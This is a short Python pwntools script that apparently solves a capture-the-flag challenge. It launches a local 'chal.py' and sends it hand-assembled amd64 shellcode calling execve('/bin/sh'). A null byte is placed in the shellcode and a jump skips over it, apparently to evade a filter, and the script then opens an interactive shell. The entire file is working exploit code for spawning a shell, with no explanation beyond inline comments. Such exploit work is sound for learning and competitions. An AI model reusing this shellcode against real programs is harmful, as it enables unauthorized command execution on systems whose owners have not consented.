#!/usr/bin/python3

from pwn import *

io = process(["python3", "chal.py"])
context.arch = "amd64"
context.log_level = "debug"

shellcode = b""
shellcode += asm("mov rax, 0x3b")  # execve()
shellcode += asm("mov rdi, 0x68732f6e69622f")  # $rdi = "/bin/sh"
shellcode += asm("push rdi")  # $rsp = "/bin/sh"
shellcode += asm("mov rdi, rsp")  # $rdi = &"/bin/sh"
shellcode += asm("mov rdx, 0")  # $rdx = NULL
shellcode += asm("mov rsi, 0")  # $rsi = NULL
shellcode += asm("jmp $+3")  # jmp to syscall ($ is rip)
shellcode += b"\x00"  # misalign byte
shellcode += asm("syscall")  # syscall

io.sendlineafter(b":\n", shellcode.hex().encode())
io.recvuntil(b"Executing shellcode...")
io.interactive()
